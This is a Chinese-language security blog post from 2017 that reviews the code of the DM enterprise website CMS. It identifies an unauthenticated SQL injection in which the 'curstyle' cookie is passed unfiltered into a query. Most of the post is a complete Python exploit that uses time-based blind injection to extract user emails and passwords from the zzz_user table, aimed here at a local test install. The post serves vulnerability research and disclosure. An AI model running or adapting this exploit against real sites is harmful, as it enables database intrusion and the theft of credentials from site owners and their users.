---
title: DM企业建站系统前台盲注
date: 2017-01-29 21:24:30
tags: 
 - cms
categories: codereview
---

# 概述
今天搞了一下动态调试的东西，然后顺便看了看上次下的[DM企业建站系统2017.01.23](http://www.demososo.com/down.html)。

<!-- more -->

# 前台cookie 时间盲注
大致跟了一下几个入口文件，该套cms主要的安全措施为`htmlentities`，在POST&&GET的输入点做了html实体化的操作，但是这并不转义单引号（默认不转义单引号具体可看[htmlentities](http://www.php.net/manual/en/function.htmlentities.php)），看了一下进行数据库查询的sql语句，涉及到字符串类型时，都是单引号闭合，那么很清楚，在进行数据库查询时容易产生sql注入漏洞。
那么接下来主要找一下进行数据库操作的位置。

1. POST&&GET
2. COOKIE 

ps：这里就随便找了一个地方，因为这套系统注入不要太多，连后台登陆都可以 :P

前面提到对POST&&GET做了实体转义，但是grep找了一下cookie，发现并没有对cookie的值进行安全操作，直接带入数据库查询。
indexDM_load.php Line 108

```
...

if(@$_COOKIE["curstyle"]<>'') 		
    $curstyle = $_COOKIE["curstyle"];
else 
    $curstyle = $row['curstyle'];
    
...

$sqlstyle = "SELECT * from ".TABLE_STYLE." where pidname='$curstyle' $andlangbh limit 1"; 
 //echo $sqlstyle;exit;
if(getnum($sqlstyle)>0){
	$rowstyle = getrow($sqlstyle);
```
上述为漏洞的主要成因点，如果cookie中存在curstyle,优先选用cookie中的值，然后带入数据库查询。由于没有找到具体回显数据的地方，所以采用时间盲注的方式获取数据。

带上自己写的EXP

```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Created by wh1t3P1g at 2017/1/30

import requests,time

class CookieBlindSqlInjection:

    def __init__(self,url):
        self.url=url
        self.len=0

    def getLength(self,column,table):
        payload0 = "curstyle=1'||if((select length(cast(bin(length({column})) as char)) from {table} limit {line_start},1)={flag},sleep(5),1)=1#"
        payload1 = "curstyle=1'||if((select substr(bin(length({column})),{col_start},1) from {table} limit {line_start},1)=1,1,sleep(5))=1#"
        #first confirm bin-format data length
        len=0
        for i in range(1,9):
            cookie=payload0.format(column=column,table=table,line_start=0,flag=i)
            flag=self.send(cookie)
            if flag=="0":
                len=i
                break
        res=""
        for i in range(1,len+1):
            cookie=payload1.format(column=column,col_start=i,table=table,line_start=0)
            flag=self.send(cookie)
            res+=flag
            # print res
        self.len=int(res,2)
        pprint("*", "fetch "+column+" length: "+str(self.len))
        return int(res,2)

    def getData(self,column,table):
        payload0="curstyle=1'||if((select length(cast(bin(ascii(substr({column},{data_start},1))) as char)) from {table} limit {line_start},1)={flag},sleep(5),1)=1#"
        payload1 = "curstyle=1'||if((select substr(bin(ascii(substr({column},{data_start},1))),{col_start},1) from {table} limit {line_start},1)=1,1,sleep(5))=1#"
        total_res=""
        for i in range(1,self.len+1):#具体数据的长度
            len = 0
            for j in range(1, 9):
                cookie = payload0.format(column=column,data_start=i, table=table, line_start=0, flag=j)
                flag = self.send(cookie)
                if flag == "0":
                    len = j
                    break
            # print "len:"+str(len)
            res = ""
            for k in range(1, len + 1):
                cookie = payload1.format(column=column,data_start=i, col_start=k, table=table, line_start=0)
                flag = self.send(cookie)
                res += flag
                # print res
            total_res+=chr(int(res,2))
            pprint("*", "fetch "+column+": "+total_res)
        return total_res

    def send(self,cookie):
        headers={"Cookie":cookie}
        try:
            r = requests.get(self.url, headers=headers,timeout=4)
            return "1"
        except:
            return "0"

def pprint(flag,content):
    print "[{flag}] [{time}] {content}" \
        .format(flag=flag, time=time.asctime(time.localtime(time.time())), content=content)

if __name__=='__main__':
    cookieBlindSqlInjection=CookieBlindSqlInjection("http://127.0.0.1/cms/DM/20170123/")
    pprint("*","program start")
    pprint("*", "start fetching column[email]")
    cookieBlindSqlInjection.getLength("email","zzz_user")
    email=cookieBlindSqlInjection.getData("email","zzz_user")
    pprint("*", "start fetching column[ps]")
    cookieBlindSqlInjection.getLength("ps", "zzz_user")
    ps=cookieBlindSqlInjection.getData("ps", "zzz_user")
    pprint("*", "[email]: "+email+" ,[ps]: "+ps)
    pprint("*", "program done")

```

ps:DM这个鬼，代码写的好乱啊T_T




